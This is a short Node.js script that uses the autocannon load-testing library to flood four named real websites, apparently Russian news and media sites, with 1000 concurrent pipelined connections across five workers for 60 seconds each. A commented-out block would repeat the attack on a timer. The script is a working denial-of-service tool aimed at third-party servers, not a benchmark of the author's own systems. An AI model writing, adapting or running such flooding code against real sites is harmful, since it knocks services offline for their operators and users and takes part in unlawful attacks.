#!/usr/bin/env node

'use strict';

const {
  performance,
} = require('perf_hooks');

const autocannon = require('autocannon');

const URLS = ['https://www.rubaltic.ru/', 'https://ria.ru', 'https://savelife.pw/', 'https://mediametrics.ru/'];
const DURATION = 60;

async function main (url) {
  console.info(`Start cannon against ${url} `);

  const start = performance.now();
  const instance = await autocannon({
    url,
    connections: 1000,
    pipelining: 2,
    duration: DURATION,
    workers: 5,
    requests: [
      {
        method: 'GET',
        path: '/'
      }
    ]
  }, finishedBench);

  autocannon.track(instance);

  // this is used to kill the instance on CTRL-C
  process.once('SIGINT', () => {
    instance.stop()
  });

  function finishedBench (err, res) {
    if (err) {
      console.error(err.message);
      
    } else {
      console.info(`${res.url} `, res.statusCodeStats);

      const end = performance.now();
      const used = process.memoryUsage();
      for (const key in used) {
        console.info(`${url} ${key} ${Math.round(used[key] / 1024 / 1024 * 100) / 100} MB`);
      }
      const timeSpend = (end - start) / 1000;
      console.info(`${url} time spend ${parseInt(timeSpend)}.${timeSpend.toFixed(2).substr(-2)} s`);
    }
  }
}

(async () => {
  const dt = new Date();
  const start = performance.now();
  console.info(`Application start ${dt.toString()}`);
  try {
    await Promise.all(URLS.map((item) => main(item)));

    //setInterval(async () => {
    //  await Promise.all(URLS.map((item) => main(item)));
    //}, DURATION * 1000 + 20);

    const end = performance.now();
    const used = process.memoryUsage();
    for (const key in used) {
      console.info(`${key} ${Math.round(used[key] / 1024 / 1024 * 100) / 100} MB`);
    }

    const timeSpend = (end - start) / 1000;
    console.info(`time spend ${parseInt(timeSpend)}.${timeSpend.toFixed(2).substr(-2)} s`);
  } catch (e) {
    const errMsg = e.message || '';
    console.error('Problem start main ',
      {
        error: errMsg,
      });
    setInterval(async () => {
      await main(url);
    }, DURATION * 1000  + 20);

    process.exit(1);
  }
})();
